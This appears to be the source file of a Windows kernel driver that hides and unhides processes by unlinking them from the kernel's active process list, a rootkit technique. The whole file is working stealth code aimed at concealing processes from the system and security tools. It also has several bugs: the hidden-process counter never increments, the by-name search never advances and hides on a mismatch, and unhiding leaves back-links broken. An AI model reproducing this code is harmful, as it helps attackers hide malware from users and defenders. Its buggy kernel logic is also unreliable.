#pragma warning (disable: 4100)
#include "Process.h"

hidden_process hidden_processes[MAX_HIDDEN_COUNT];
UINT64 process_index = 0;



BOOLEAN add_process_to_hidden_processes(PEPROCESS process_to_hide)
{
	if (is_process_hidden(process_to_hide))
	{
		DbgPrint("Process pid: %lu is already hidden!", get_pid(process_to_hide));
		return FALSE;
	}

	hidden_process hidden_process;
	hidden_process.eprocess = process_to_hide;
	hidden_process.pid = get_pid(process_to_hide);

	memcpy((PVOID)(hidden_processes + process_index), (PVOID)&hidden_process, sizeof(hidden_process));
	return TRUE;
}

BOOLEAN is_process_hidden(PEPROCESS process_to_hide)
{

	ULONG hidden_process_pid = get_pid(process_to_hide);
	for (UINT64 i = 0; i < process_index; i++)
	{
		if ((hidden_processes + i)->pid == hidden_process_pid)
		{
			return TRUE;
		}
	}
	return FALSE;
}





ULONG get_pid(PEPROCESS process)
{
	return *((PULONG)((PBYTE)process + PROCESS_PID_OFFSET));
}




PUCHAR get_name(PEPROCESS process)
{
	return (PUCHAR)((PBYTE)process + PROCESS_NAME_OFFSET);
}




PEPROCESS get_next_process(PEPROCESS process)
{
	PLIST_ENTRY current_list = (PLIST_ENTRY)((PBYTE)process + LIST_ENTRY_OFFSET);
	PLIST_ENTRY next_list = current_list->Flink;

	return (PEPROCESS)((PBYTE)next_list - LIST_ENTRY_OFFSET);
}




PEPROCESS get_prev_process(PEPROCESS process)
{
	PLIST_ENTRY current_list = (PLIST_ENTRY)((PBYTE)process + LIST_ENTRY_OFFSET);
	PLIST_ENTRY prev_list = current_list->Blink;

	return (PEPROCESS)((PBYTE)prev_list - LIST_ENTRY_OFFSET);
}

PEPROCESS get_hidden_eprocess_by_pid(ULONG pid)
{
	for (int i = 0; i < process_index; i++)
	{
		if (get_pid((hidden_processes + i)->eprocess) == pid)
		{
			return (hidden_processes + i)->eprocess;

		}
	}
	DbgPrint("pid: %d is not hidden!", pid);
	return (PEPROCESS)(0);
}



NTSTATUS unhide_process(ULONG pid)
{
	PEPROCESS hidden_process = get_hidden_eprocess_by_pid(pid);
	PEPROCESS current_process = PsGetCurrentProcess();
	PEPROCESS next_process = get_next_process(current_process);

	PLIST_ENTRY next_list = (PLIST_ENTRY)((PBYTE)next_process + LIST_ENTRY_OFFSET);
	PLIST_ENTRY hidden_list = (PLIST_ENTRY)((PBYTE)hidden_process + LIST_ENTRY_OFFSET);
	hidden_list->Flink = next_list;

	PLIST_ENTRY current_list = (PLIST_ENTRY)((PBYTE)current_process + LIST_ENTRY_OFFSET);
	current_list->Flink = hidden_list;

	return STATUS_SUCCESS;
}



NTSTATUS iterate_eprocess_list(PEPROCESS starting_process)
{
	ULONG starting_pid = get_pid(starting_process);

	PEPROCESS next_process = get_next_process(starting_process);
	PUCHAR name[15] = { 0 };
	memcpy(name, get_name(starting_process), 15);
	DbgPrint("Process name is: %s. it's pid is: %d\n", name, get_pid(starting_process));

	while (get_pid(next_process) != starting_pid)
	{
		memcpy(name, get_name(next_process), 15);
		DbgPrint("Process name is: %s. it's pid is: %d\n", name, get_pid(next_process));
		next_process = get_next_process(next_process);
	}
	return STATUS_SUCCESS;
}


NTSTATUS hide_process_by_pid(ULONG target_pid, PEPROCESS starting_process)
{
	ULONG starting_pid = get_pid(starting_process);

	PEPROCESS current_process = starting_process;
	PEPROCESS next_process = get_next_process(starting_process);
	PEPROCESS prev_process = get_prev_process(starting_process);

	while (get_pid(next_process) != starting_pid)
	{

		if (target_pid == get_pid(current_process))
		{

			PLIST_ENTRY prev_list = (PLIST_ENTRY)((PBYTE)prev_process + LIST_ENTRY_OFFSET);
			PLIST_ENTRY next_list = (PLIST_ENTRY)((PBYTE)next_process + LIST_ENTRY_OFFSET);

			prev_list->Flink = next_list;
			next_list->Blink = prev_list;

			DbgPrint("Pid: %d is hidden successfully\n", get_pid(current_process));
			add_process_to_hidden_processes(current_process);

			return STATUS_SUCCESS;
		}

		prev_process = current_process;
		current_process = next_process;
		next_process = get_next_process(next_process);

	}
	DbgPrint("pid not found!\n");
	return STATUS_FAILED_DRIVER_ENTRY;
}


NTSTATUS hide_process_by_name(PUCHAR target_name, PEPROCESS starting_process)
{
	ULONG starting_pid = get_pid(starting_process);

	PEPROCESS current_process = starting_process;
	PEPROCESS next_process = get_next_process(starting_process);
	PEPROCESS prev_process = get_prev_process(starting_process);
	while (get_pid(current_process) != starting_pid)
	{
		if (strcmp((PCHAR)target_name, (PCHAR)get_name(current_process)))
		{
			PLIST_ENTRY prev_list = (PLIST_ENTRY)((PBYTE)prev_process + LIST_ENTRY_OFFSET);
			PLIST_ENTRY next_list = (PLIST_ENTRY)((PBYTE)next_process + LIST_ENTRY_OFFSET);

			prev_list->Flink = next_list;
			next_list->Blink = prev_list;

			DbgPrint("Process: %s is hidden successfully\n", get_name(current_process));
			add_process_to_hidden_processes(current_process);

			return STATUS_SUCCESS;
		}
	}
	DbgPrint("Name not found!\n");
	return STATUS_FAILED_DRIVER_ENTRY;
}

